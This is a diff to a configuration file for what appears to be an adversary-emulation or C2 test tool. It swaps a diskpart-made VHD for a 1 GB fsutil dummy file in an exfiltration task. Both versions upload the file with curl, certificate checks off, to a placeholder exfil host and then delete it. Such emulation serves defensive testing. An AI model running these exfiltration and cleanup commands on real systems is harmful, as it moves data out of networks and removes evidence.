@@ -11,7 +11,7 @@ task_name = c2_http_mm_dd_YYYY_HH_MM
 agent_name = 1w2x3y4z
 
 [exfil_actions]
-exfil_file = exfil_file.vhd
-exfil_file_path = c:\
-exfil_file_size = 1000
-command_list = echo CREATE VDISK FILE="$EXFIL_FILE_PATH$EXFIL_FILE" MAXIMUM=$EXFIL_FILE_SIZE TYPE=FIXED > $EXFIL_FILE_PATHdiskpart.txt; diskpart /s $EXFIL_FILE_PATHdiskpart.txt; dir $EXFIL_FILE_PATH, c:\Windows\System32\curl.exe -k -F file=@c:\$EXFIL_FILE_PATH$EXFIL_FILE $EXFIL_TYPE$TLS://$EXFIL_HOST:$EXFIL_PORT/p, del $EXFIL_FILE_PATH$EXFIL_FILE; del $EXFIL_FILE_PATHdiskpart.txt
+exfil_file = exfil_file.bin
+exfil_path = c:\\
+exfil_size = 1073741824
+command_list = fsutil file createnew $EXFIL_PATH$EXFIL_FILE $EXFIL_SIZE; dir $EXFIL_PATH, c:\Windows\System32\curl.exe -k -F file=@$EXFIL_PATH$EXFIL_FILE $EXFIL_TYPE$TLS://$EXFIL_HOST:$EXFIL_PORT/p, del $EXFIL_PATH$EXFIL_FILE
